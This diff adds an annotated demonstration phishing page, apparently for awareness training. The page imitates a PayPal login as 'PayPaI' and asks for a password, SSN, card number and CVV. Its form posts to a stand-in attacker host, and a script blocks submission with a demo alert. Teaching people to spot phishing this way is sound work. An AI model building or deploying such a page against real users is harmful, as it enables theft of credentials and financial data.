@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- PHISHING INDICATOR: Suspicious title mimicking PayPal -->
+    <title>PayPaI - Secure Login | Verify Your Account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #003087 0%, #009cde 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            width: 380px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #003087;
+            font-size: 32px;
+            font-weight: bold;
+            /* PHISHING INDICATOR: Using text instead of official logo */
+        }
+        .logo span {
+            color: #009cde;
+        }
+        /* PHISHING INDICATOR: Urgent warning message to create panic */
+        .urgent-warning {
+            background: #ff6b6b;
+            color: white;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #003087;
+        }
+        /* PHISHING INDICATOR: Asking for excessive information */
+        .ssn-field, .credit-card-field {
+            border-color: #ff6b6b !important;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #003087;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .btn-login:hover {
+            background: #001f5c;
+        }
+        .links {
+            text-align: center;
+            font-size: 13px;
+        }
+        .links a {
+            color: #003087;
+            text-decoration: none;
+        }
+        /* PHISHING INDICATOR: Fake security badge */
+        .fake-security {
+            margin-top: 20px;
+            text-align: center;
+            padding: 10px;
+            background: #e8f5e9;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #2e7d32;
+        }
+        .fake-security::before {
+            content: "🔒 ";
+        }
+        /* PHISHING INDICATOR: Hidden fields to capture data */
+        .hidden-capture {
+            position: absolute;
+            left: -9999px;
+        }
+        /* PHISHING INDICATOR: Countdown timer to create urgency */
+        .countdown {
+            text-align: center;
+            color: #d32f2f;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- PHISHING INDICATOR: Typosquatting - PayPaI instead of PayPal -->
+            <h1>Pay<span>PaI</span></h1>
+        </div>
+        
+        <!-- PHISHING INDICATOR: Urgent/threatening message -->
+        <div class="urgent-warning">
+            ⚠️ Your account has been limited! Verify now or lose access!
+        </div>
+        
+        <!-- PHISHING INDICATOR: Fake countdown to pressure user -->
+        <div class="countdown">
+            Account will be suspended in: <span id="timer">14:59</span>
+        </div>
+        
+        <!-- PHISHING INDICATOR: Form submits to suspicious endpoint -->
+        <form action="http://evil-server.example.com/capture.php" method="POST" id="phishing-form">
+            <div class="form-group">
+                <label>Email or Phone Number</label>
+                <input type="text" name="email" placeholder="Enter your email" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <!-- PHISHING INDICATOR: Asking for SSN - legitimate sites don't do this in login -->
+            <div class="form-group">
+                <label>Social Security Number (for verification)</label>
+                <input type="text" name="ssn" class="ssn-field" placeholder="XXX-XX-XXXX" required>
+            </div>
+            
+            <!-- PHISHING INDICATOR: Asking for credit card at login -->
+            <div class="form-group">
+                <label>Credit Card Number (to verify ownership)</label>
+                <input type="text" name="cc_number" class="credit-card-field" placeholder="1234 5678 9012 3456" required>
+            </div>
+            
+            <div class="form-group">
+                <label>CVV</label>
+                <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+            </div>
+            
+            <!-- PHISHING INDICATOR: Hidden fields to capture browser info -->
+            <input type="hidden" name="user_agent" id="ua-capture">
+            <input type="hidden" name="screen_res" id="screen-capture">
+            
+            <button type="submit" class="btn-login">Verify Account Now</button>
+        </form>
+        
+        <div class="links">
+            <a href="#">Forgot password?</a> | <a href="#">Sign up</a>
+        </div>
+        
+        <!-- PHISHING INDICATOR: Fake security badge to build false trust -->
+        <div class="fake-security">
+            256-bit SSL Encrypted | Verified by Norton Security
+        </div>
+    </div>
+    
+    <!-- PHISHING INDICATOR: JavaScript to capture user data -->
+    <script>
+        // Capture browser information
+        document.getElementById('ua-capture').value = navigator.userAgent;
+        document.getElementById('screen-capture').value = screen.width + 'x' + screen.height;
+        
+        // Fake countdown timer to create urgency
+        let time = 899;
+        setInterval(() => {
+            if (time > 0) {
+                time--;
+                let minutes = Math.floor(time / 60);
+                let seconds = time % 60;
+                document.getElementById('timer').textContent = 
+                    minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+            }
+        }, 1000);
+        
+        // Prevent form from actually submitting (for demo purposes)
+        document.getElementById('phishing-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('DEMO: This is a test phishing page. In a real attack, your data would be sent to an attacker.');
+        });
+        
+        // PHISHING INDICATOR: Disable right-click to prevent inspection
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
+
